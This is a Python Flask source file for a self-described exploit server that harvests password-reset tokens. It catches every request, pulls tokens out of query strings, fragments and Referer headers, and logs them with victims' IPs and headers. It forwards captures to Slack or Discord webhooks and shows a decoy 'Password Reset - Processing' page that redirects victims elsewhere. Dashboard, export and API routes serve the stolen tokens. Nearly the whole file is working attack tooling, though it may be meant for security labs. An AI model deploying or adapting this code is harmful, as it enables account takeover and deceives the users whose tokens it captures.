from flask import Flask, request, jsonify, render_template_string, abort
from datetime import datetime
import json
import sqlite3
import os
import requests
from urllib.parse import parse_qs, urlparse

app = Flask(__name__)

# Configuration
DATABASE = 'captured_tokens.db'
SLACK_WEBHOOK = os.environ.get('SLACK_WEBHOOK')  # Optional: for instant notifications
DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK')  # Optional

def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip TEXT,
                  method TEXT,
                  full_url TEXT,
                  token TEXT,
                  user_agent TEXT,
                  headers TEXT,
                  body TEXT)''')
    conn.commit()
    conn.close()

init_db()

def send_notification(token, ip, url):
    """Send instant notification when token is captured"""
    message = f"🚨 TOKEN CAPTURED!\nToken: {token}\nIP: {ip}\nURL: {url}"
    
    if SLACK_WEBHOOK:
        try:
            requests.post(SLACK_WEBHOOK, json={"text": message})
        except:
            pass
    
    if DISCORD_WEBHOOK:
        try:
            requests.post(DISCORD_WEBHOOK, json={"content": message})
        except:
            pass

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
def catch_all(path):
    # Get request details
    full_url = request.url
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    method = request.method
    user_agent = request.headers.get('User-Agent', 'Unknown')
    headers = dict(request.headers)
    
    # Extract body if present
    body = None
    try:
        body = request.get_data(as_text=True) if request.data else None
    except:
        pass
    
    # Extract token from multiple sources
    token = None
    token_source = None
    
    # Check query parameters
    for param in ['token', 'temp-forgot-password-token', 'reset-token', 'code', 'key', 
                  'resetToken', 'password-reset-token', 'verify']:
        if param in request.args:
            token = request.args.get(param)
            token_source = f"query_param:{param}"
            break
    
    # Check URL fragment (if sent via some proxy)
    parsed = urlparse(full_url)
    fragment = parsed.fragment
    if not token and 'token=' in fragment:
        token = parse_qs(fragment).get('token', [None])[0]
        token_source = "url_fragment"
    
    # Check Referer header
    referer = request.headers.get('Referer', '')
    if not token and 'token=' in referer:
        try:
            token = referer.split('token=')[1].split('&')[0]
            token_source = "referer_header"
        except:
            pass
    
    # Store in database
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''INSERT INTO captures (timestamp, ip, method, full_url, token, user_agent, headers, body)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (datetime.now().isoformat(), ip, method, full_url, token, 
               user_agent, json.dumps(headers), body))
    conn.commit()
    conn.close()
    
    # Log to console
    print(f"\n{'='*70}")
    print(f"[{datetime.now()}] 🚨 CAPTURED REQUEST")
    print(f"IP: {ip}")
    print(f"Method: {method}")
    print(f"Path: /{path}")
    print(f"Full URL: {full_url}")
    if token:
        print(f"🎯 TOKEN FOUND: {token}")
        print(f"Source: {token_source}")
        send_notification(token, ip, full_url)
    print(f"{'='*70}\n")
    
    # Return convincing response based on path
    if 'forgot-password' in path or 'reset' in path:
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Password Reset - Processing</title>
            <meta http-equiv="refresh" content="3;url=https:// legitimate-site.com">
            <style>
                body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
                .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; 
                         border-radius: 50%; width: 40px; height: 40px; 
                         animation: spin 1s linear infinite; margin: 20px auto; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <h2>Processing Password Reset...</h2>
            <div class="loader"></div>
            <p>Please wait while we verify your request.</p>
            <p style="color: #666; font-size: 12px;">Redirecting to secure server...</p>
        </body>
        </html>
        '''), 200
    
    return jsonify({"status": "ok"}), 200

@app.route('/logs')
def view_logs():
    """View all captured data"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('SELECT * FROM captures ORDER BY id DESC LIMIT 100')
    rows = c.fetchall()
    conn.close()
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Exploit Server - Captured Data</title>
        <style>
            body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
            h1 { color: #f85149; }
            .capture { border: 1px solid #30363d; margin: 10px 0; padding: 15px; border-radius: 6px; }
            .token { color: #f85149; font-weight: bold; font-size: 1.2em; background: #da3633; 
                    color: white; padding: 5px 10px; border-radius: 4px; display: inline-block; }
            .timestamp { color: #8b949e; }
            .ip { color: #58a6ff; }
            pre { background: #161b22; padding: 10px; overflow-x: auto; border-radius: 4px; }
            .filter { margin: 20px 0; }
            input { padding: 8px; background: #21262d; border: 1px solid #30363d; color: white; }
            button { padding: 8px 16px; background: #238636; color: white; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <h1>🕵️ Captured Tokens</h1>
        <div class="filter">
            <form method="get">
                <input type="text" name="search" placeholder="Search tokens..." value="{{ search }}">
                <button type="submit">Filter</button>
                <a href="/export" style="color: #58a6ff; margin-left: 20px;">Export JSON</a>
                <a href="/clear" style="color: #f85149; margin-left: 20px;" 
                   onclick="return confirm('Clear all logs?')">Clear Logs</a>
            </form>
        </div>
    '''
    
    for row in rows:
        html += f'''
        <div class="capture">
            <div><span class="timestamp">{row[1]}</span> | <span class="ip">{row[2]}</span></div>
            <div>Method: {row[3]}</div>
            <div>URL: {row[4]}</div>
            {'<div>🎯 TOKEN: <span class="token">' + row[5] + '</span></div>' if row[5] else ''}
            <details>
                <summary>Headers & Details</summary>
                <pre>{row[7]}</pre>
                {'<pre>Body: ' + str(row[8]) + '</pre>' if row[8] else ''}
            </details>
        </div>
        '''
    
    html += '</body></html>'
    return html

@app.route('/export')
def export_json():
    """Export all data as JSON"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('SELECT * FROM captures ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    
    data = [{
        'id': r[0], 'timestamp': r[1], 'ip': r[2], 'method': r[3],
        'url': r[4], 'token': r[5], 'user_agent': r[6], 'headers': r[7]
    } for r in rows]
    
    return jsonify(data)

@app.route('/clear')
def clear_logs():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('DELETE FROM captures')
    conn.commit()
    conn.close()
    return 'Logs cleared. <a href="/logs">Back to logs</a>'

@app.route('/api/tokens')
def api_tokens():
    """API endpoint to get just the tokens"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('SELECT token, timestamp, ip FROM captures WHERE token IS NOT NULL ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return jsonify([{'token': r[0], 'time': r[1], 'ip': r[2]} for r in rows])

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)